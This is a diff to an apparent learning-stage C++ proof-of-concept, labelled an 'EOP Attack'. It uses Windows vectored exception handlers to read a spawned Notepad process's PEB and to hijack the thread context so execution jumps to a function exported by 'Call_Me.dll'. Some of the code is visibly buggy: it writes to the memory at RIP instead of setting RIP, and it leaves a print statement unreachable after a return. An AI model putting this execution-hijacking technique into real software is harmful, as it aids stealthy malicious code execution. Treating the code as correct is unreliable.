@@ -13,6 +13,7 @@ using namespace std;
 // Define Globals
 LPCWSTR g_TargetProc = L"C:\\Windows\\system32\\Notepad.exe";
 PVOID g_MyFunc = nullptr;
+PVOID g_MyOtherFunc = nullptr;
 
 typedef NTSTATUS(WINAPI* pNtQUeryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
@@ -70,15 +71,14 @@ BOOL DummyProcCreate(IN LPCWSTR procName) {
 	}
 	// ENumerate PEB Addr
 	// PEB Size
-	// PEB Fields - POC
+	// PEB Fields
+	// POC Phase I
 	cout << "============= Gathering PEB Statistics ==============" << endl;
 	cout << "[+] PEB Base Address: " << hex << pbi.PebBaseAddress << endl;
 	cout << "[+] PEB Size: " << sizeof(peb) << " bytes" << endl;
 	cout << "[+] Value of IsDebugged: " << int(peb.BeingDebugged) << endl;
 
 	cout << endl;
-	cout << "Now commencing Phase II of POC..." << endl;
-
 
 	return TRUE;
 
@@ -92,8 +92,6 @@ BOOL DummyProcCreate(IN LPCWSTR procName) {
 
 BOOL FindDLL(VOID) {
 
-	// Use a function pointer to invoke the function -- May not be necessary here since we are updating RIP to thisFunc
-	typedef void (WINAPI* hackedFunctionPtr)();
 	// Dynamically load DLL
 	HMODULE hMod = GetModuleHandle(L"Call_Me.dll");
 	if (hMod == NULL) {
@@ -111,56 +109,86 @@ BOOL FindDLL(VOID) {
 		return FALSE;
 	}
 	cout << "Success! Function Address found at 0x" << hex << funcAddr << endl;
+	// Assign funcAddr to global variable for RIP assignment
 	g_MyFunc = funcAddr;
+
+	PVOID funcAddrTwo = GetProcAddress(hMod, "benignFunction");
+	if (funcAddrTwo == nullptr) {
+		cerr << "[!] GetProcAddress failed with error: 0x" << hex << GetLastError() << endl;
+		return FALSE;
+	}
+	g_MyOtherFunc = funcAddrTwo;
+	cout << "Success! Benign Function Address found at 0x" << hex << funcAddrTwo << endl;
 	return TRUE;
 }
 
-VOID benignFunction(VOID) {
-	cout << "Did you notice anything fishy just now?" << endl;
-}
+
 
 BOOL evilFunc(IN PEXCEPTION_POINTERS pExceptionInfo) {
 	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
 	// Evil Function to invoke after VEH chain registration and invocation
-	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
+	// Attempting New EXCEPTION criteria
+	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
 		cout << "[!] We have a violation! Now Phase 1 of EOP Attack..Read PEB Base Address" << endl;
 		if (!DummyProcCreate(g_TargetProc)) {
 			cout << "[!] Error creating Process with error 0x" << hex << GetLastError() << endl;
 			return FALSE;
 		}
-		if (!FindDLL()) {
-			cerr << "[!] Error with FindDLL function: 0x" << hex << GetLastError() << endl;
-			return FALSE;
-		}
 
 		}
 	return TRUE;
 }
 
+BOOL phaseTwo(IN PEXCEPTION_POINTERS pExceptionInfo) {
+	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
+	// Evil Function to invoke after VEH chain registration and invocation
+	// Attempting New EXCEPTION criteria
+	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+		cout << "[!] We have another violation! Now Initiating Phase 2 of EOP Attack..RIP manipulation" << endl;
+		if (!FindDLL()) {
+			cerr << "[!] Error with FindDLL function: 0x" << hex << GetLastError() << endl;
+		}
+		return TRUE;
+		cout << "[!] Phase 2 succeeded!" << endl;
+
+	}
+	return FALSE;
+}
+
+
+
 LONG CALLBACK CustomExcHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
-	static BOOL hasRunOnce = FALSE;  // Static flag to ensure RIP handling happens once
 
 	// Call evilFunc in the event of an exception
 	if (!evilFunc(pExceptionInfo)) {
 		// Handle BP Exception
-		cout << "[!] EvilFunc returned FALSE, continuing search." << endl;
-		return EXCEPTION_CONTINUE_SEARCH;
-	}
-
-	cout << "[+] Current Address @ RIP: 0x" << hex << pCtx->Rip << endl;
-	pCtx->Rip = reinterpret_cast<DWORD64>(g_MyFunc);  // Modify RIP to g_MyFunc
-	cout << "[+] New Address @ RIP: 0x" << hex << pCtx->Rip << endl;
-	cout << "[+] Now redirecting execution to bad function..." << endl;
-
-	for (DWORD64 i{ 0 }; i != 1; ++i) {
-		if (pCtx->Rip == (DWORD64)g_MyFunc) {
-			cout << "Executing bad func" << endl;
-		}
-		return EXCEPTION_CONTINUE_EXECUTION;
+		cout << "[!] EvilFunc failed!" << endl;
+		return EXCEPTION_EXECUTE_HANDLER;
 	}
 
 	return EXCEPTION_CONTINUE_SEARCH;  // Continue searching for other handlers if RIP wasn't modified
+}
+
+LONG CALLBACK NewExecHandler(PEXCEPTION_POINTERS pExceptionInfo) {
+	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
+
+	// Call phaseTwo in the event of an exception
+	if (!phaseTwo(pExceptionInfo)) {
+		cerr << "[!] Error with PhaseTwo function: 0x" << hex << GetLastError() << endl;
+		return EXCEPTION_CONTINUE_SEARCH; // Continue searching for other handlers if RIP wasn't modified
+	}
+
+	cout << "[+] Current Address @ RIP: 0x" << hex << pCtx->Rip << endl;
+	*(DWORD64*)pCtx->Rip = reinterpret_cast<DWORD64>(g_MyFunc);  // Modify RIP to g_MyFunc
+	cout << "[+] New Address @ RIP: 0x" << hex << pCtx->Rip << endl;
+	pCtx->Rsp -= 8;
+	*(DWORD64*)pCtx->Rsp = reinterpret_cast<DWORD64>(g_MyOtherFunc);
+	if (pCtx->Rip == (DWORD64)g_MyFunc) {
+		cout << "[+] Now directing execution to g_MyFunc Address" << endl;
+	}
+	return EXCEPTION_CONTINUE_EXECUTION; // Execute RIP manipulation function
+
 }
 
 
